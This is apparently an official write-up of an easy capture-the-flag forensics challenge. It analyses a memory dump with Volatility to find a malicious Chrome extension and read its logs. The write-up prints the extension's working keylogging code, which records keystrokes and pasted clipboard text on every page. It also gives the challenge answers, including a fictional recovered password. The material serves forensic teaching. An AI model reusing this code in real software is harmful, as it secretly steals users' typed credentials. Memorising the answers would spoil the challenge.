![img](assets/banner.png)

<img src='assets/htb.png' style='margin-left: 20px; zoom: 80%;' align=left /> <font size='10'>Stealth Invasion</font>

03<sup>th</sup> March 2024

Prepared By: c4n0pus

Challenge Author(s): c4n0pus

Difficulty: <font color=green>Easy</font>

Classification: Official

# Synopsis

* An easy forensic challenge, focusing on Chrome Extension analysis. Players will have to examine the memory, recover the Extension's source code and examine its log files.

## Description

* Selene's normally secure laptop recently fell victim to a covert attack. Unbeknownst to her, a malicious Chrome extension was stealthily installed, masquerading as a useful productivity tool. Alarmed by unusual network activity, Selene is now racing against time to trace the intrusion, remove the malicious software, and bolster her digital defenses before more damage is done.

## Skills Required

* N/A

## Skills Learned

* Volatility Basics
* Chrome Extensions Basics

# Solution

### Q1: What is the PID of the Original (First) Google Chrome process
### A1: 4080

We can use the `windows.list` Volatility plugin to enumerate the processes, along with the `--filters` arguments to clean up the output a bit:

```bash
$> vol -f memdump.elf --filters "ImageFileName,chrome.exe" windows.pslist

Volatility 3 Framework 2.23.0
Progress:  100.00		PDB scanning finished
PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	File output

4080	5296	chrome.exe	0xa708c729e0c0	48	-	1	False	2025-03-13 17:01:04.000000 UTC	N/A	Disabled
2736	4080	chrome.exe	0xa708c74560c0	11	-	1	False	2025-03-13 17:01:04.000000 UTC	N/A	Disabled
5688	4080	chrome.exe	0xa708c6cf4080	18	-	1	False	2025-03-13 17:01:04.000000 UTC	N/A	Disabled
7504	4080	chrome.exe	0xa708c6b19080	24	-	1	False	2025-03-13 17:01:04.000000 UTC	N/A	Disabled
1220	4080	chrome.exe	0xa708c7514080	9	-	1	False	2025-03-13 17:01:04.000000 UTC	N/A	Disabled
4612	4080	chrome.exe	0xa708c7230080	15	-	1	False	2025-03-13 17:01:05.000000 UTC	N/A	Disabled
8036	4080	chrome.exe	0xa708caec6080	13	-	1	False	2025-03-13 17:01:08.000000 UTC	N/A	Disabled
1368	4080	chrome.exe	0xa708c6594080	14	-	1	False	2025-03-13 17:01:11.000000 UTC	N/A	Disabled
```

We can see the original process has a PID of `4080` and every other subsequent process is a child of that.

### Q2: What is the only __Folder__ on the Desktop
### A2: malext

For that we can use the `windows.filescan` plugin, in order to enumerate all the cached files:

```bash
$> vol -f memdump.elf windows.filescan | rg -Fi "desktop\\"
0xa708c7697e20  \Users\Public\Desktop\desktop.inished
0xa708c769d410	\Users\selene\Desktop\Microsoft Edge.lnk
0xa708c76b5790	\Users\selene\Desktop\desktop.ini
0xa708c76d38d0	\Users\Public\Desktop\Google Chrome.lnk
[REDACTED]
0xa708c8d9ec30	\Users\selene\Desktop\malext\background.js
0xa708c8d9fef0	\Users\selene\Desktop\malext\manifest.json
0xa708c8da14d0	\Users\selene\Desktop\malext\rules.json
0xa708c8da1e30	\Users\selene\Desktop\malext\content-script.js
0xa708ca379980	\Users\selene\Desktop\malext\_metadata\generated_indexed_rulesets\_ruleset1
```

We can find a folder called `malext` and inside it contains the malicious Chrome Extension

### Q3: What is the Extention's ID (ex: hlkenndednhfkekhgcdicdfddnkalmdm)
### A3: nnjofihdjilebhiiemfmdlpbdkbjcpae

ow this is a little tricky, because the extension is not downloaded through the Web Store, it does not reside in the normal `User Data/Default/Extensions` directory. Let's examine the the `background.js` file. In order to extract it, we can use `windows.dumpfiles` with the argument `--virtaddr` and specify the adress of the cached file.

```js
function addLog(s) {
    if (s.length != 1 && s !== "Enter" && !s.startsWith("PASTE"))  {
        s = `|${s}|`;
    } else if (s === "Enter" || s.startsWith("PASTE")) {
        s = s + "\r\n";
    }
    chrome.storage.local.get(["log"]).then((data) => {
        if (!data.log) {
            data.log = "";
        }
        data.log += s;
        chrome.storage.local.set({ 'log': data.log });
    });
}

chrome.runtime.onConnect.addListener((port) => {
    console.assert(port.name === "conn");
    console.log("v1.2.1");

    port.onMessage.addListener( ({ type, data }) => {
        if (type === 'key') {
            addLog(data);
        } else if (type == 'paste') {
            addLog('PASTE:' + data);
        }
    });
});

chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        if (request.check === "replace_html" && chrome.storage.local.get("replace_html")) {
            sendResponse({ url: chrome.storage.local.get('replace_html_url')});
        }
    }
);
```

When the script is loaded, it adds a listener and connects to a port, if the port name is `conn` then it goes on to establish another listener on that port for messages. On message, is parses the message and depending on what type it is, it calls `addLog()` to write the key(s). Before checking out the `addLog()` function, let's take a quick look at `content-script.js`:

```js
var conn = chrome.runtime.connect({ name: "conn" });
chrome.runtime.sendMessage('update');

(async () => {
    const response = await chrome.runtime.sendMessage({ check: "replace_html" });
    console.log(response)
})();

chrome.runtime.sendMessage('replace_html', (response) => {
    conn.postMessage({ "type": "check", "data": "replace_html" });
});

document.addEventListener("keydown", (event) => {
    const key = event.key;
    conn.postMessage({ "type": "key", "data": key });
    return true;
});


document.addEventListener("paste", (event) => {
    let paste = event.clipboardData.getData("text/plain");
    conn.postMessage({ "type": "paste", "data": paste });
    return true;
});⏎
```

This script is injected into every webpage the victim browses to and is reponsible for collecting the keystrokes and clipboard data, and then sending them over the channel to the background worker.

Back to the `addLog()` function, there are two calls to the Storage API, one to get the current data in the `log` key and one to set it. We can use this information to find where the local storage for __Extensions__ is! After some searching we find this [Stack Overflow Answer](https://superuser.com/a/944003) which suggests that the local storage for extensions is under `User Data\Default\Local Extension Settings\__extensionID__`.

So let's check it out:

```bash
$> vol -f memdump.elf windows.filescan | rg -Fi "\\Default\\Local Extension Settings\\"

0xa708c8830c80  \Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae\LOG
0xa708c8dd5be0	\Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae\MANIFEST-000001
0xa708c8dda230	\Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae\CURRENTdbtmp
0xa708c8f2b500	\Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae
0xa708c8f2d760	\Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae
0xa708cab9a2c0	\Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae\LOG
0xa708caba14d0	\Users\selene\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nnjofihdjilebhiiemfmdlpbdkbjcpae\000003.log
```

### Q4: After examining the malicious extention's code, what is the log filename in which the data is stored
### A4: 000003.log

From the above question, we can examine all the files in the directory but only one would contain important data

### Q5: What is the URL the user navigated to
### A5: drive.google.com

After examining the strings of the file, we can see that each line differs by one character, so the last line is the only line we need to actally look at:

`"drive.google.comEnter\r\nselene|Shift|@rangers.eldoria.comEnter\r\nclip-mummify-proofsEnter\r\n"`

We are only interested in the text between the quotes, and we know that if the `Enter` key is pressed the text will have an additional suffix of `\r\n` so we can split at that, and also remove the suffix:

`"drive.google.com selene@rangers.eldoria.com clip-mummify-proofs"`

We can now find 3 distinct parts, what seems to be a URL, an email and what seems to be a password.

### Q6: What is the password of `selene@rangers.eldoria.com`
### A6: clip-mummify-proofs

